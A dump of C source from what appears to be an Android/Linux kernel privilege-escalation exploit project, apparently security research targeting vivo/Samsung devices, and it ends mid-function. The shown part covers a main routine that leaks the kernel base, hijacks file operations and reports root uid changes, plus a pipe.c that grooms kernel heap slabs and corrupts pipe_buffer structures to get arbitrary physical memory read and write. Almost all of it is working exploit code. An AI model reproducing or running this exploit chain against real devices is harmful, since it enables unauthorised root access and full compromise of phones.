#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_SIGRETURN) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
  if (!slide_sigreturn_preflight()) {
    pr_error("slide sigreturn preflight failed\n");
    return 1;
  }
#endif
  if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
  }
  if (getenv("SLIDE_ONLY") || getenv("P0_ONLY")) {
    pr_success("slide-only done base=%016zx slide=%016zx p0_offset=%08zx\n",
               kaslr_base, kaslr_slide, slide_p0_offset);
    return 0;
  }
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  if (!slide_p0_session_fresh) {
    pr_error("full route requires P0 discovery in the current exploit process; "
             "refusing forced or retained cross-process slide\n");
    return 1;
  }
#endif

#if defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
    APP_FOPS_DATA_ALIAS_DIAG_ONLY
  if (!verify_fops_data_alias_before_production()) {
    pr_error("fops data alias verification failed; production skipped\n");
    return 1;
  }
#endif

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
  pr_info("reusing verified fops payload page=%016zx pipe_page=%016zx\n",
          page_base, pipebuf_page_base);
  if (!is_direct_ptr(page_base) || !is_direct_ptr(pipebuf_page_base)) {
    return 1;
  }
#else
  reset_pipe_attempt();
#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
  if (!prepare_p0_pipe_oracle()) {
    pr_error("fops oracle pipe preparation failed\n");
    return 1;
  }
  pr_info("fresh fops oracle pipe page=%016zx\n", pipebuf_page_base);
#else
#if !defined(APP_FOPS_BEFORE_PIPE) || !APP_FOPS_BEFORE_PIPE
  pipebuf_page_base = prepare_pipe_buffer_page();
  pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 1;
  }
#endif
#endif
#endif
#endif

  pin_to_core(CORE);
#if !defined(APP_FOPS_REUSE_VERIFIED_PAGE) || \
    !APP_FOPS_REUSE_VERIFIED_PAGE
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
#endif

#ifdef QEMU_FOPS_GDB_HOLD_SECONDS
  pr_info("qemu fops gdb hold seconds=%d base=%016zx\n",
          QEMU_FOPS_GDB_HOLD_SECONDS, page_base);
  sleep(QEMU_FOPS_GDB_HOLD_SECONDS);
#endif

#ifdef QEMU_GDB_HOLD_SECONDS
  pr_info("qemu gdb hold seconds=%d base=%016zx\n",
          QEMU_GDB_HOLD_SECONDS, page_base);
  sleep(QEMU_GDB_HOLD_SECONDS);
#endif

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (!page_base) {
    return 1;
  }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  pr_info("app fops stage=prepare-return base=%016zx\n", page_base);
  if (getenv("FOPS_DIAGNOSTIC_STOP_AFTER_PREPARE")) {
    pr_warning("diagnostic stop after fops prepare; trigger not entered\n");
    if (pipe_prepare_child > 0) {
      SYSCHK(kill(pipe_prepare_child, SIGKILL));
      SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
      pipe_prepare_child = -1;
    }
    return 2;
  }
  pr_info("app fops stage=trigger-enter base=%016zx\n", page_base);
#endif
#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
  int fops_oracle_triggered =
      app_trigger_fops_oracle_slot(P0_ORACLE_GATE_SLOT);
  int fops_oracle_gate =
      fops_oracle_triggered ? verify_p0_pipe_oracle_gate() : 0;
  int fops_oracle_restored = 0;
  if (fops_oracle_gate != 0) {
    app_publish_p0_dirty();
    fops_oracle_restored =
        app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_SLOT);
  }
  pr_info("fops-oracle-diag triggered=%d gate=%d restored=%d "
          "page=%016zx object_min=%d delay=%d; stopping before misc_fops\n",
          fops_oracle_triggered, fops_oracle_gate, fops_oracle_restored,
          page_base, APP_FOPS_MIN_OBJECT_INDEX,
          APP_FOPS_PSELECT_DELAY_USEC);
  return 1;
#else
  durable_log_checkpoint("fops-page-held");
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
  const int fops_fresh_page_attempts = 1;
#else
#ifdef APP_FOPS_FRESH_PAGE_ATTEMPTS
  const int fops_fresh_page_attempts = APP_FOPS_FRESH_PAGE_ATTEMPTS;
#else
  const int fops_fresh_page_attempts = 1;
#endif
#endif
  for (int attempt = 1; attempt <= fops_fresh_page_attempts; attempt++) {
    if (attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base) {
        pr_warning("app fops fresh page unavailable attempt=%d/%d\n",
                   attempt, fops_fresh_page_attempts);
        continue;
      }
    }
    int triggered = app_trigger_fops_slide_route();
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
            attempt, triggered);
#endif
    int verified = 0;
#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
    APP_FOPS_DEFER_ALIAS_READBACK
    int postwrite_result = 0;
    int probe_restored = 0;
    if (fops_data_alias_deferred) {
      postwrite_result = verify_p0_pipe_data_page(
          fops_data_alias_deferred_target, fake_fops);
      probe_restored =
          app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_RESTORE_SLOT);
      pr_info("fops postwrite direct read target=%016zx initial=%016llx "
              "want=%016zx result=%d probe_restored=%d triggered=%d\n",
              fops_data_alias_deferred_target,
              (unsigned long long)fops_data_alias_deferred_initial,
              fake_fops, postwrite_result, probe_restored, triggered);
#if defined(APP_FOPS_DURABLE_POSTWRITE_LOG) && \
    APP_FOPS_DURABLE_POSTWRITE_LOG
      /* Preserve the authoritative result even if RDB dies before
       * dlopen returns.  stdout may be a pipe (adb shell), where fsync
       * returns EINVAL: that is not a failure worth aborting for. */
      fflush(NULL);
      if (fsync(STDOUT_FILENO) != 0 && errno != EINVAL && errno != EBADF) {
        pr_warning("fsync stdout errno=%d\n", errno);
      }
#endif
      fops_data_alias_deferred = 0;
    }
    if (triggered && postwrite_result == 1 && probe_restored) {
      verified = try_cfi_stage();
    } else {
      cfi_last_step = 35;
      cfi_last_errno = 0;
    }
#else
    verified = triggered && try_cfi_stage();
#endif
    pr_info("app fops slide attempt=%d/%d triggered=%d verified=%d "
            "step=%d errno=%d\n",
            attempt, fops_fresh_page_attempts, triggered, verified,
            cfi_last_step, cfi_last_errno);
    if (verified || cfi_dirty_seen) {
      break;
    }
    pr_info("app fops clean miss; releasing reclaim state before fresh "
            "page attempt=%d/%d\n",
            attempt, fops_fresh_page_attempts);
  }
#else
  for (int attempt = 1; attempt <= 1; attempt++) {
    int triggered = app_trigger_fops_slide_route();
    pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
            attempt, triggered);
    int verified = triggered && try_cfi_stage();
    pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
            "step=%d errno=%d\n",
            attempt, triggered, verified, cfi_last_step, cfi_last_errno);
    if (verified || cfi_dirty_seen) {
      break;
    }
  }
#endif
#endif
#else
  run_main_route_threads();
#endif

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }
#if defined(QEMU_STACK_WRITER_ONLY) && QEMU_STACK_WRITER_ONLY
  int exploit_ok = atomic_load(&cfi_stage_done);
#else
  int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
  if (exploit_ok) {
    pid_t keeper = spawn_allocation_keeper();
    pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
               keeper);
  }
#endif
  return exploit_ok ? 0 : 1;
}

```

---

## offset.h

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/offset.h`

```c
#ifndef TARGET_HEADER
#define TARGET_HEADER "targets/pa3q-S938NKSUACZF1/target.h"
#endif

#include TARGET_HEADER

```

---

## pipe.c

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/pipe.c`

```c
#include "common.h"

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#include P0_FINGERPRINT_HEADER
#endif

#define PHYSRW_PROOF_OFF 0x7000
#define PHYS_READ_TAG "nebusec_70687973727730"
#define PHYS_WRITE_TAG "nebusec_70687973727731"
#define PHYS64_SEED 0x306365737562656eULL
#define PHYS64_NEXT 0x316365737562656eULL

_Static_assert(sizeof(PHYS_READ_TAG) == sizeof(PHYS_WRITE_TAG),
               "phys proof tag sizes");

static int pipe_objects_ready;
static int pipe_fds_drain[PIPE_DRAIN][2];
static int pipe_fds_reclaim[PIPE_RECLAIM][2];
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static int p0_gate_holders[PIPE_RECLAIM][2];
static int p0_gate_holders_initialized;

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static void close_p0_gate_holders(void) {
  if (!p0_gate_holders_initialized) {
    return;
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    if (p0_gate_holders[i][0] >= 0) {
      close(p0_gate_holders[i][0]);
    }
    if (p0_gate_holders[i][1] >= 0) {
      close(p0_gate_holders[i][1]);
    }
    p0_gate_holders[i][0] = -1;
    p0_gate_holders[i][1] = -1;
  }
  p0_gate_holders_initialized = 0;
}
#endif
#endif

pid_t pipe_prepare_child = -1;
uint64_t kmalloc_pipe_cache;
uint64_t kmalloc_normal_1k_cache;
uint64_t kmalloc_normal_2k_cache;
uint64_t kmalloc_cgroup_1k_cache;
uint64_t kmalloc_cgroup_2k_cache;
uint64_t candidate_slab_cache;
int pipe_cache_gate_ok;
int pipe_cache_page_index = -1;
int pipe_cache_slot_hit = -1;
uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
uintptr_t pipebuf_page_base;
uintptr_t pipebuf_addr;
int pipebuf_pipe_idx = -1;
char physrw_readback[64];
char physrw_after_write[64];
int physrw_read_ok;
int physrw_write_ok;
int pipe_scan_vmemmap;
int pipe_scan_ops;
int pipe_scan_len;
int pipe_probe_found;
uint64_t pipe_probe_page;
uint64_t pipe_probe_ops;
uint64_t pipe_probe_private;
uint32_t pipe_probe_len;
uint32_t pipe_probe_flags;
uint64_t pipe_scan_first_page;
uint64_t pipe_scan_first_ops;
uint64_t pipe_scan_q0;
uint64_t pipe_scan_q1;
uint64_t pipe_scan_q2;
uint64_t pipe_scan_q3;
uint32_t pipe_scan_first_len;
uint32_t pipe_scan_first_flags;
uint64_t physrw_read64_before;
uint64_t physrw_read64_after;
uint64_t physrw_write64_value;
int physrw_read64_ok;
int physrw_write64_ok;

void init_ctx(struct mm_ctx *ctx, size_t cnt) {
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
}

void resize_pipe_slots(int pipefd[2], size_t slots) {
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
}

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  resize_pipe_slots(pipefd, 2);
}

void alloc_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
}

void free_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, 2);
}

uintptr_t prepare_pipe_buffer_page_child(void) {
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);

  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = -1;
    spray.memfds[i] = clone_memfd();
  }

  setup_kernelsnitch();

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = -1;
    pre.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = -1;
    post.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    kill_child(pre.childs[i]);
  }
  for (size_t i = 0; i < post.mm_cnt; i++) {
    kill_child(post.childs[i]);
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    kill_child(spray.childs[i]);
  }
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_collisions_ready()) {
    pr_error("pipe KernelSnitch collision finding failed\n");
  }

  unsigned char *buf = malloc(SKB_SEND_SIZE);
  memset(buf, 0x50, SKB_SEND_SIZE);

  int skb_sv[2];
  int pcp_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
  pin_to_core(CORE);

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    SYSCHK(close(pre.memfds[i]));
    pre.memfds[i] = -1;
  }
  for (size_t i = 0; i < post.mm_cnt - 1; i++) {
    SYSCHK(close(post.memfds[i]));
    post.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    SYSCHK(close(spray.memfds[i]));
    spray.memfds[i] = -1;
  }
  SYSCHK(close(pcp_sv[0]));
  SYSCHK(close(pcp_sv[1]));

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(leak_memfd));
  SYSCHK(sendmsg(skb_sv[0], &msg, 0));

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
  }
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  if (getenv("KS_LEAK_ONLY")) {
    pr_success("KernelSnitch leak-only mm=%016zx base=%016zx object_index=%zu\n",
               leaked, base, (leaked - base) / MM_STRUCT_SZ);
    fflush(NULL);
    _exit(0);
  }
#endif

  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    alloc_pipe_object(pipe_fds_drain[i]);
  }

  pin_to_core(CORE);
  SYSCHK(close(skb_sv[0]));
  SYSCHK(close(skb_sv[1]));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    alloc_pipe_object(pipe_fds_reclaim[i]);
  }

  close_ctx_memfds(&prep);
  close_ctx_memfds(&spray);
  close_ctx_memfds(&pre);
  close_ctx_memfds(&post);
  free_ctx_storage(&prep);
  free_ctx_storage(&spray);
  free_ctx_storage(&pre);
  free_ctx_storage(&post);
  free(buf);
  return base;
}

uintptr_t prepare_pipe_buffer_page(void) {
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    make_pipe_object(pipe_fds_drain[i]);
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    make_pipe_object(pipe_fds_reclaim[i]);
  }
  pipe_objects_ready = 1;

  int result_pipe[2];
  SYSCHK(pipe(result_pipe));
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
    SYSCHK(close(result_pipe[0]));
    uintptr_t base = prepare_pipe_buffer_page_child();
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
      pipe_fds_drain[i][0] = -1;
      pipe_fds_drain[i][1] = -1;
    }
    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
    for (;;) {
      sleep(60);
    }
  }

  pipe_prepare_child = child;
  SYSCHK(close(result_pipe[1]));
  uintptr_t base = 0;
  ssize_t got = read(result_pipe[0], &base, sizeof(base));
  SYSCHK(close(result_pipe[0]));
  if (got != (ssize_t)sizeof(base)) {
    pr_error("pipe page child did not report base\n");
  }
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    close(pipe_fds_drain[i][0]);
    close(pipe_fds_drain[i][1]);
    pipe_fds_drain[i][0] = -1;
    pipe_fds_drain[i][1] = -1;
  }
  return base;
}

void reset_pipe_attempt(void) {
  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }

  if (pipe_objects_ready) {
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
    }
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      close(pipe_fds_reclaim[i][0]);
      close(pipe_fds_reclaim[i][1]);
    }
    pipe_objects_ready = 0;
  }

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  close_p0_gate_holders();
#else
  if (p0_gate_holders_initialized) {
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      if (p0_gate_holders[i][0] >= 0) {
        close(p0_gate_holders[i][0]);
      }
      if (p0_gate_holders[i][1] >= 0) {
        close(p0_gate_holders[i][1]);
      }
      p0_gate_holders[i][0] = -1;
      p0_gate_holders[i][1] = -1;
    }
    p0_gate_holders_initialized = 0;
  }
#endif
#endif

  pipebuf_page_base = 0;
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_cache_gate_ok = 0;
  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  candidate_slab_cache = 0;
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
}

uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
  uintptr_t page = direct_to_page(addr);
  uintptr_t head_addr = page + STRUCT_PAGE_COMPOUND_HEAD_OFF;
  uint64_t compound_head = kernel_read64(fd, head_addr);
  if (compound_head & 1) {
    return compound_head & ~1ULL;
  }
  return page;
}

uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}

uintptr_t pipe_buf_ops_addr(void) {
  return text_addr(ANON_PIPE_BUF_OPS);
}

int pipe_cache_matches(uint64_t slab_cache) {
  if (slab_cache == 0) {
    return 0;
  }
  if (KMALLOC_PIPE_INDEX == 10) {
    return slab_cache == kmalloc_normal_1k_cache ||
           slab_cache == kmalloc_cgroup_1k_cache;
  }
  if (KMALLOC_PIPE_INDEX == 11) {
    return slab_cache == kmalloc_normal_2k_cache ||
           slab_cache == kmalloc_cgroup_2k_cache;
  }
  return slab_cache == kmalloc_pipe_cache;
}

int pipe_reclaim_cache_gate(int fd) {
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  memset(pipe_page_slab_cache, 0, sizeof(pipe_page_slab_cache));
  memset(pipe_page_type, 0, sizeof(pipe_page_type));

  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  memset(cache_slots, 0, sizeof(cache_slots));
  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
  kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
  kmalloc_normal_1k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_normal_2k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
  kmalloc_cgroup_1k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_cgroup_2k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];

  kmalloc_pipe_cache =
    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
  pr_info("pipe caches normal1k=%016zx normal2k=%016zx "
          "cgroup1k=%016zx cgroup2k=%016zx selected=%016zx\n",
          kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
          kmalloc_cgroup_1k_cache, kmalloc_cgroup_2k_cache,
          kmalloc_pipe_cache);
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page = pipebuf_page_base + off;
    uintptr_t head = direct_to_head_page(fd, page);
    uint64_t cache08 = kernel_read64(fd, head + 0x08);
    uint64_t cache10 = kernel_read64(fd, head + 0x10);
    uint64_t cache18 = kernel_read64(fd, head + 0x18);
    uint64_t cache20 = kernel_read64(fd, head + 0x20);
    uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
    uintptr_t type_addr = head + STRUCT_PAGE_TYPE_OFF;
    uint32_t page_type = (uint32_t)kernel_read64(fd, type_addr);
    pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
    pipe_page_type[off / PAGE_SIZE] = page_type;
    int cache_match = pipe_cache_matches(slab_cache);
    pr_info("pipe page idx=%zu page=%016zx head=%016zx "
            "cache08=%016llx cache10=%016llx cache18=%016llx "
            "cache20=%016llx type=%08x match=%d\n",
            off / PAGE_SIZE, page, head,
            (unsigned long long)cache08,
            (unsigned long long)cache10,
            (unsigned long long)cache18,
            (unsigned long long)cache20, page_type, cache_match);
    if (off == 0 || cache_match) {
      candidate_slab_cache = slab_cache;
    }
    for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
      if (cache_slots[slot] == slab_cache) {
        pipe_cache_slot_hit = slot;
      }
    }
    if (cache_match) {
      pipebuf_page_base = page;
      pipe_cache_page_index = off / PAGE_SIZE;
      pipe_cache_gate_ok = 1;
      return 1;
    }
  }

  pipe_cache_gate_ok = 0;
  return 0;
}

int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab) {
  for (size_t off = 0; off < ORDER3_SIZE; off += PIPE_SCAN_CHUNK) {
    if (kernel_read_data(fd, base + off, slab + off, PIPE_SCAN_CHUNK) !=
        PIPE_SCAN_CHUNK) {
      return 0;
    }
  }
  return 1;
}

int find_pipe_buffer(int fd, uintptr_t base) {
  unsigned char slab[ORDER3_SIZE];
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  pipe_scan_q0 = 0;
  pipe_scan_q1 = 0;
  pipe_scan_q2 = 0;
  pipe_scan_q3 = 0;
  if (!read_pipe_slab(fd, base, slab)) {
    return 0;
  }
  memcpy(&pipe_scan_q0, slab + 0x00, 8);
  memcpy(&pipe_scan_q1, slab + 0x08, 8);
  memcpy(&pipe_scan_q2, slab + 0x10, 8);
  memcpy(&pipe_scan_q3, slab + 0x18, 8);

  for (size_t off = 0; off + sizeof(struct user_pipe_buffer) <= ORDER3_SIZE;
       off += 8) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));
    if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
      pipe_scan_vmemmap++;
      if (pipe_scan_first_page == 0) {
        pipe_scan_first_page = pb.page;
        pipe_scan_first_ops = pb.ops;
        pipe_scan_first_len = pb.len;
        pipe_scan_first_flags = pb.flags;
      }
    } else {
      continue;
    }
    if (pb.ops == pipe_buf_ops_addr()) {
      pipe_scan_ops++;
    }
    if (pb.len > 0 && pb.len <= PIPE_RECLAIM) {
      pipe_scan_len++;
    }
    if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
      continue;
    }
    if (pb.len == 0 || pb.len > PIPE_RECLAIM) {
      continue;
    }

    pipebuf_addr = base + off;
    pipebuf_pipe_idx = (int)pb.len - 1;
    pipe_probe_found = 1;
    pipe_probe_page = pb.page;
    pipe_probe_ops = pb.ops;
    pipe_probe_private = pb.private;
    pipe_probe_len = pb.len;
    pipe_probe_flags = pb.flags;
    return 1;
  }

  return 0;
}

int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len) {
  struct user_pipe_buffer saved;
  struct user_pipe_buffer restored;
  size_t direct_off = direct_addr & (PAGE_SIZE - 1);
  if (!out || !len || buf_addr > UINTPTR_MAX - (sizeof(saved) - 1) ||
      (buf_addr >> PAGE_SHIFT) !=
                  ((buf_addr + sizeof(saved) - 1) >> PAGE_SHIFT) ||
      !is_direct_ptr(direct_addr) || len > PAGE_SIZE - direct_off) {
    return 0;
  }
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  ssize_t patch = kernel_write_data(fd, buf_addr, &pb, sizeof(pb));
  if (patch != (ssize_t)sizeof(pb)) {
    int restore = kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
                  (ssize_t)sizeof(saved);
    pr_error("pipe read buffer patch failed ret=%zd restore=%d\n",
             patch, restore);
    return 0;
  }

  ssize_t got = read(pipefd[0], out, len);
  int restored_ok =
      kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
          (ssize_t)sizeof(saved) &&
      kernel_read_data(fd, buf_addr, &restored, sizeof(restored)) ==
          (ssize_t)sizeof(restored) &&
      memcmp(&restored, &saved, sizeof(saved)) == 0;
  int ok = got == (ssize_t)len && restored_ok;
  if (!ok) {
    pr_error("pipe read failed got=%zd want=%zu restore=%d\n",
             got, len, restored_ok);
  }
  return ok;
}

int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len) {
  struct user_pipe_buffer saved;
  struct user_pipe_buffer restored;
  size_t direct_off = direct_addr & (PAGE_SIZE - 1);
  if (!data || !len || buf_addr > UINTPTR_MAX - (sizeof(saved) - 1) ||
      (buf_addr >> PAGE_SHIFT) !=
                  ((buf_addr + sizeof(saved) - 1) >> PAGE_SHIFT) ||
      !is_direct_ptr(direct_addr) || len > PAGE_SIZE - direct_off) {
    return 0;
  }
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  ssize_t patch = kernel_write_data(fd, buf_addr, &pb, sizeof(pb));
  if (patch != (ssize_t)sizeof(pb)) {
    int restore = kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
                  (ssize_t)sizeof(saved);
    pr_error("pipe write buffer patch failed ret=%zd restore=%d\n",
             patch, restore);
    return 0;
  }

  ssize_t wrote = write(pipefd[1], data, len);
  int restored_ok =
      kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
          (ssize_t)sizeof(saved) &&
      kernel_read_data(fd, buf_addr, &restored, sizeof(restored)) ==
          (ssize_t)sizeof(restored) &&
